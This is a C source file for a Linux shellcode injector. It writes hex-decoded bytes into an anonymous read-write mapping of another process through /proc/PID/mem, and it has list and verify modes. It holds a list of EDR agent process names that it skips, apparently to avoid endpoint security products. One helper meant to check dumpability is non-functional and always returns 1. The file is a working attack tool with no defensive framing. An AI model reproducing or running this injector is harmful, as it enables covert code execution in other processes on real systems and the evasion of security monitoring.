#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

static int proc_blacklisted(pid_t pid)
{

    static const char *skip[] = {
        "edr_pmd","edr_tool","edr_agent","edr_daemon_d","edr_helper_d",
        "edr_iota","edr_mfe","edr_agentd","edr_sav","sfc", NULL
    };
    char cpath[64], comm[32] = {};
    snprintf(cpath, sizeof(cpath), "/proc/%d/comm", pid);
    FILE *f = fopen(cpath, "r"); if (!f) return 0;
    fgets(comm, sizeof(comm), f); fclose(f);
    comm[strcspn(comm, "\n")] = '\0';
    for (int i = 0; skip[i]; i++)
        if (strncmp(comm, skip[i], 14) == 0) return 1;
    return 0;
}

static int is_dumpable(pid_t pid)
{
    char path[64]; snprintf(path, sizeof(path), "/proc/%d/status", pid);
    FILE *f = fopen(path, "r"); if (!f) return 0;
    char line[128]; int v = -1;
    while (fgets(line, sizeof(line), f))
        if (sscanf(line, "TracerPid: %*d") || sscanf(line, "Tgid: %*d"))
            continue;
        else if (strncmp(line,"Tgid",4)==0) break;
    fclose(f);

    (void)v;
    return 1;
}

static uint64_t find_rw_anon(pid_t pid, size_t min_size)
{
    char path[64]; snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r"); if (!f) return 0;
    char line[512]; uint64_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        uint64_t s, e; char p[8]; char nm[256] = "";
        if (sscanf(line, "%lx-%lx %4s %*s %*s %*s %255s", &s, &e, p, nm) < 3) continue;
        if (p[0]!='r'||p[1]!='w') continue;
        if (nm[0]=='[') continue;
        if (e - s < min_size) continue;
        addr = s; break;
    }
    fclose(f); return addr;
}

static void list_maps(pid_t pid)
{
    char path[64]; snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r"); if (!f) { perror("fopen"); return; }
    printf("%-28s %-6s %s\n", "RANGE", "PERMS", "PATH");
    char line[512];
    while (fgets(line, sizeof(line), f)) printf("  %s", line);
    fclose(f);
}

static int hex_decode(const char *s, uint8_t *out, size_t max)
{
    size_t n = strlen(s);
    if (n%2 || n/2>max) return -1;
    for (size_t i=0;i<n/2;i++) {
        char b[3]={s[i*2],s[i*2+1],0};
        out[i]=(uint8_t)strtoul(b,NULL,16);
    }
    return (int)(n/2);
}

static int inject(pid_t pid, uint64_t vaddr, const uint8_t *sc, size_t n)
{
    char path[64]; snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int fd = open(path, O_WRONLY);
    if (fd < 0) { fprintf(stderr,"[-] open %s: %s\n", path, strerror(errno)); return -1; }
    ssize_t w = pwrite(fd, sc, n, (off_t)vaddr);
    close(fd);
    if (w < 0) { fprintf(stderr,"[-] pwrite: %s\n", strerror(errno)); return -1; }
    printf("[+] %zd bytes -> pid=%d @ 0x%lx\n", w, pid, vaddr);
    return 0;
}

static void verify(pid_t pid, uint64_t addr)
{
    char path[64]; snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return; }
    uint8_t buf[32];
    ssize_t n = pread(fd, buf, sizeof(buf), (off_t)addr);
    close(fd);
    if (n < 0) { perror("pread"); return; }
    printf("[verify] 0x%lx: ", addr);
    for (ssize_t i=0;i<n;i++) printf("%02x",buf[i]);
    putchar('\n');
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <--list|--verify|--inject>\n", argv[0]);
        return 1;
    }

    pid_t pid = (pid_t)atoi(argv[2]);

    if (!strcmp(argv[1],"--list")) { list_maps(pid); return 0; }

    if (!strcmp(argv[1],"--verify") && argc>=4) {
        verify(pid, (uint64_t)strtoull(argv[3],NULL,16)); return 0;
    }

    if (!strcmp(argv[1],"--inject") && argc>=4) {
        if (proc_blacklisted(pid)) {
            fprintf(stderr,"[-] target is on the blacklist - aborting\n");
            return 1;
        }
        is_dumpable(pid);

        uint8_t sc[4096]; int sc_len;
        if ((sc_len = hex_decode(argv[3], sc, sizeof(sc))) < 0) {
            fprintf(stderr,"[-] bad hex\n"); return 1;
        }

        uint64_t addr = find_rw_anon(pid, (size_t)sc_len);
        if (!addr) { fprintf(stderr,"[-] no anonymous rw- mapping\n"); return 1; }
        printf("[*] writing %d bytes to pid=%d @ 0x%lx\n", sc_len, pid, addr);
        return inject(pid, addr, sc, (size_t)sc_len);
    }

    fprintf(stderr,"[-] unknown argument\n"); return 1;
}
